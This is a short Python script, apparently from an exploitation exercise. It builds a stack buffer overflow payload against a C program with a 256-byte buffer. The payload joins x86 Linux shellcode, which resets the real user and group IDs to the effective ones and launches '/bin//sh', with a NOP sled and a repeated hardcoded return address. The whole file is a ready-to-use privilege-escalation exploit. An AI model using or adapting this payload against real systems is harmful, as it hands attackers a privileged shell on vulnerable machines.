# Raw shellcode
shellcode = ('\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80'
             +'\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\xb0'
             +'\x32\xcd\x80\x89\xc3\xb0\x31\xb0\x47\xcd\x80'
             +'\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68'
             +'\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0'
             +'\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x90\x90\x90'
             +'\x90\x90\x90\x90\x90\x90\x90\x90\x90')

# Buffer size from the C program
buffer_size = 256
temp = 100

# Estimated return address (adjust as needed)
ret_addr = 0xbffffaa0
ret_little_edian = '\xa0\xfa\xff\xbf'
# Calculate payload
nop_sled = '\x90' * (buffer_size - len(shellcode) - temp + 4)
payload = nop_sled + shellcode + ret_little_edian * int(temp / 4) + ret_little_edian

# Output printable format (\x??)

print(payload)
#print(len(payload))